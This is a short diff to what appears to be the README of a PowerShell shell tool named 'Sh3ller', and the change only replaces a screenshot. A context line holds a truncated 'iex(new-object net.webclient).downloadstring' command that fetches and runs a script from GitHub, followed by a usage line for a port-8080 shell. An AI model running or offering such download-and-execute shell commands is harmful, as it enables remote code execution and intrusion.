@@ -37,4 +37,5 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 ```
 Sh3ller 8080
 ```
-<img width="2936" height="811" alt="image" src="https://github.com/user-attachments/assets/e5d21a82-ed22-4292-b461-68cc78530c10" />
+<img width="2170" height="847" alt="image" src="https://github.com/user-attachments/assets/e3e0c647-5580-4ee8-acb2-17fb46c7aa07" />
+
